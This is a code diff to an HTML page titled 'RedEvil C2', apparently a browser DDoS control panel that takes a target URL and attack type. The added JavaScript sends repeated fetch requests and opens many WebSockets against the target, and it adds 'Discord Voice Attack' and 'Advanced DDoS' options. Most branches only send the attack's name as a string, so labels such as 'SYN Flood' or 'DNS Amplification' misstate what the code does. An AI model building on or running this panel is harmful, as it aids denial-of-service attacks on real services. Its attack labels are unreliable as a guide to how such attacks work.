@@ -43,13 +43,20 @@
         button:hover {
             background-color: #cc0000;
         }
+        #gif-container {
+            margin-top: 20px;
+        }
+        #gif {
+            width: 300px;
+            height: auto;
+        }
     </style>
 </head>
 <body>
     <div id="controls">
         <h1>RedEvil C2</h1>
         <label for="target-url">Target URL:</label>
-        <input type="text" id="target-url" placeholder="https://example.com">
+        <input type="text" id="target-url" placeholder="Ur Target Here">
         <br>
         <label for="attack-type">Attack Type:</label>
         <select id="attack-type">
@@ -66,6 +73,8 @@
             <option value="RDP Flood">RDP Flood</option>
             <option value="SIP Flood">SIP Flood</option>
             <option value="CloudFlare Bypass">CloudFlare Bypass</option>
+            <option value="Discord Voice Attack">Discord Voice Attack</option>
+            <option value="Advanced DDoS">Advanced DDoS</option>
         </select>
         <br>
         <label for="attack-duration">Attack Duration (seconds):</label>
@@ -77,6 +86,9 @@
         <p>Bot Count: 300</p>
         <p>Bot Status: <span id="bot-status"></span></p>
         <p>Attack Status: <span id="attack-status"></span></p>
+    </div>
+    <div id="gif-container">
+        <img id="gif" src="https://g.top4top.io/p_333987tz71.gif" alt="Attack GIF">
     </div>
 
     <script>
@@ -132,6 +144,134 @@
                     fetch(targetUrl, { headers })
                         .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
                         .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
+                } else if (attackType === 'UDP Flood') {
+                    const udpSocket = new WebSocket('ws://' + targetUrl);
+                    udpSocket.onopen = function() {
+                        udpSocket.send('UDP Flood');
+                    };
+                } else if (attackType === 'SYN Flood') {
+                    const synSocket = new WebSocket('ws://' + targetUrl);
+                    synSocket.onopen = function() {
+                        synSocket.send('SYN Flood');
+                    };
+                } else if (attackType === 'ICMP Flood') {
+                    const icmpSocket = new WebSocket('ws://' + targetUrl);
+                    icmpSocket.onopen = function() {
+                        icmpSocket.send('ICMP Flood');
+                    };
+                } else if (attackType === 'DNS Amplification') {
+                    const dnsSocket = new WebSocket('ws://' + targetUrl);
+                    dnsSocket.onopen = function() {
+                        dnsSocket.send('DNS Amplification');
+                    };
+                } else if (attackType === 'NTP Amplification') {
+                    const ntpSocket = new WebSocket('ws://' + targetUrl);
+                    ntpSocket.onopen = function() {
+                        ntpSocket.send('NTP Amplification');
+                    };
+                } else if (attackType === 'SSDP Amplification') {
+                    const ssdpSocket = new WebSocket('ws://' + targetUrl);
+                    ssdpSocket.onopen = function() {
+                        ssdpSocket.send('SSDP Amplification');
+                    };
+                } else if (attackType === 'Memcached Amplification') {
+                    const memcachedSocket = new WebSocket('ws://' + targetUrl);
+                    memcachedSocket.onopen = function() {
+                        memcachedSocket.send('Memcached Amplification');
+                    };
+                } else if (attackType === 'Chargen Amplification') {
+                    const chargenSocket = new WebSocket('ws://' + targetUrl);
+                    chargenSocket.onopen = function() {
+                        chargenSocket.send('Chargen Amplification');
+                    };
+                } else if (attackType === 'SNMP Amplification') {
+                    const snmpSocket = new WebSocket('ws://' + targetUrl);
+                    snmpSocket.onopen = function() {
+                        snmpSocket.send('SNMP Amplification');
+                    };
+                } else if (attackType === 'RDP Flood') {
+                    const rdpSocket = new WebSocket('ws://' + targetUrl);
+                    rdpSocket.onopen = function() {
+                        rdpSocket.send('RDP Flood');
+                    };
+                } else if (attackType === 'SIP Flood') {
+                    const sipSocket = new WebSocket('ws://' + targetUrl);
+                    sipSocket.onopen = function() {
+                        sipSocket.send('SIP Flood');
+                    };
+                } else if (attackType === 'CloudFlare Bypass') {
+                    const cloudflareSocket = new WebSocket('ws://' + targetUrl);
+                    cloudflareSocket.onopen = function() {
+                        cloudflareSocket.send('CloudFlare Bypass');
+                    };
+                } else if (attackType === 'Discord Voice Attack') {
+                    const discordSocket = new WebSocket('ws://' + targetUrl);
+                    discordSocket.onopen = function() {
+                        discordSocket.send('Discord Voice Attack');
+                    };
+                } else if (attackType === 'Advanced DDoS') {
+                    // Simulate a more powerful and sophisticated DDoS attack
+                    console.log(`Starting Advanced DDoS attack on ${targetUrl} with ${botCount} bots.`);
+                    alert(`Starting Advanced DDoS attack on ${targetUrl} with ${botCount} bots.`);
+                    for (let i = 0; i < numBots; i++) {
+                        setTimeout(() => {
+                            fetch(targetUrl, { headers })
+                                .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
+                                .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
+                            const udpSocket = new WebSocket('ws://' + targetUrl);
+                            udpSocket.onopen = function() {
+                                udpSocket.send('UDP Flood');
+                            };
+                            const synSocket = new WebSocket('ws://' + targetUrl);
+                            synSocket.onopen = function() {
+                                synSocket.send('SYN Flood');
+                            };
+                            const icmpSocket = new WebSocket('ws://' + targetUrl);
+                            icmpSocket.onopen = function() {
+                                icmpSocket.send('ICMP Flood');
+                            };
+                            const dnsSocket = new WebSocket('ws://' + targetUrl);
+                            dnsSocket.onopen = function() {
+                                dnsSocket.send('DNS Amplification');
+                            };
+                            const ntpSocket = new WebSocket('ws://' + targetUrl);
+                            ntpSocket.onopen = function() {
+                                ntpSocket.send('NTP Amplification');
+                            };
+                            const ssdpSocket = new WebSocket('ws://' + targetUrl);
+                            ssdpSocket.onopen = function() {
+                                ssdpSocket.send('SSDP Amplification');
+                            };
+                            const memcachedSocket = new WebSocket('ws://' + targetUrl);
+                            memcachedSocket.onopen = function() {
+                                memcachedSocket.send('Memcached Amplification');
+                            };
+                            const chargenSocket = new WebSocket('ws://' + targetUrl);
+                            chargenSocket.onopen = function() {
+                                chargenSocket.send('Chargen Amplification');
+                            };
+                            const snmpSocket = new WebSocket('ws://' + targetUrl);
+                            snmpSocket.onopen = function() {
+                                snmpSocket.send('SNMP Amplification');
+                            };
+                            const rdpSocket = new WebSocket('ws://' + targetUrl);
+                            rdpSocket.onopen = function() {
+                                rdpSocket.send('RDP Flood');
+                            };
+                            const sipSocket = new WebSocket('ws://' + targetUrl);
+                            sipSocket.onopen = function() {
+                                sipSocket.send('SIP Flood');
+                            };
+                            const cloudflareSocket = new WebSocket('ws://' + targetUrl);
+                            cloudflareSocket.onopen = function() {
+                                cloudflareSocket.send('CloudFlare Bypass');
+                            };
+                            const discordSocket = new WebSocket('ws://' + targetUrl);
+                            discordSocket.onopen = function() {
+                                discordSocket.send('Discord Voice Attack');
+                            };
+                        }, i * 100);
+                    }
                 } else {
                     console.log(`Sending ${attackType} to ${targetUrl}`);
                 }
